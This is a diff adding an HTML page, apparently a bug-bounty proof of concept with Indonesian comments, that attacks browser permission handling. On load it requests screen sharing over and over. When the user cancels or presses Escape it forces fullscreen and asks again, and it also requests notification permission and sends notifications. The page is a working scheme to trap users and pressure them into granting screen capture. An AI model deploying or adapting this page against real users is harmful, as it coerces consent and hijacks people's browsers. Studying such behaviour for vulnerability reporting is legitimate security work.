@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bug Bounty - Screen Share</title>
+  </head>
+  <body>
+    <h1>Selamat datang di halaman Bug Bounty</h1>
+    <p>
+      Halaman ini akan terus meminta izin berbagi layar. Jika Anda mengklik
+      "Cancel" atau menekan tombol "Esc", halaman ini akan beralih ke mode layar
+      penuh dan terus meminta izin.
+    </p>
+
+    <script>
+      let permissionRequested = false;
+
+      function requestScreenSharePermission() {
+        // Mengecek apakah browser mendukung screen sharing
+        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+          navigator.mediaDevices
+            .getDisplayMedia({ video: true })
+            .then(function (stream) {
+              // Berbagi layar berhasil, hentikan stream setelah izin
+              stream.getTracks().forEach((track) => track.stop());
+            })
+            .catch(function (error) {
+              // Jika izin ditolak atau ada kesalahan, tampilkan notifikasi lagi
+              showNotification();
+              // Jika pengguna menekan Cancel atau ESC, buka halaman ini di tab baru dan masuk fullscreen
+              if (
+                error.name === "NotAllowedError" ||
+                error.name === "AbortError"
+              ) {
+                openFullScreen();
+              }
+            });
+        } else {
+          alert("Browser Anda tidak mendukung berbagi layar.");
+        }
+      }
+
+      function showNotification() {
+        // Memeriksa apakah browser mendukung Notification API
+        if ("Notification" in window) {
+          // Meminta izin untuk menampilkan notifikasi
+          if (Notification.permission === "granted") {
+            // Menampilkan notifikasi jika izin sudah diberikan
+            new Notification("Izinkan berbagi layar?");
+          } else if (Notification.permission !== "denied") {
+            // Meminta izin notifikasi jika belum diberikan
+            Notification.requestPermission().then(function (permission) {
+              if (permission === "granted") {
+                new Notification("Izinkan berbagi layar?");
+              }
+            });
+          }
+        }
+
+        // Meminta izin berbagi layar lagi setelah notifikasi
+        requestScreenSharePermission();
+      }
+
+      // Fungsi untuk membuka halaman ini di tab baru
+      function openFullScreen() {
+        // Memaksa halaman untuk masuk ke mode layar penuh
+        if (document.documentElement.requestFullscreen) {
+          document.documentElement.requestFullscreen();
+        } else if (document.documentElement.mozRequestFullScreen) {
+          document.documentElement.mozRequestFullScreen(); // Firefox
+        } else if (document.documentElement.webkitRequestFullscreen) {
+          document.documentElement.webkitRequestFullscreen(); // Safari
+        } else if (document.documentElement.msRequestFullscreen) {
+          document.documentElement.msRequestFullscreen(); // IE/Edge
+        }
+
+        // Menjalankan permintaan izin berbagi layar lagi
+        if (!permissionRequested) {
+          permissionRequested = true;
+          requestScreenSharePermission();
+        }
+      }
+
+      // Fungsi utama untuk memulai permintaan izin berbagi layar dan notifikasi
+      function startPermissionLoop() {
+        requestScreenSharePermission();
+        showNotification();
+      }
+
+      // Menangani event ketika pengguna menekan ESC
+      document.addEventListener("keydown", function (event) {
+        if (event.key === "Escape") {
+          openFullScreen();
+        }
+      });
+
+      // Menjalankan fungsi untuk meminta izin berbagi layar saat halaman dimuat
+      window.onload = startPermissionLoop;
+    </script>
+  </body>
+</html>
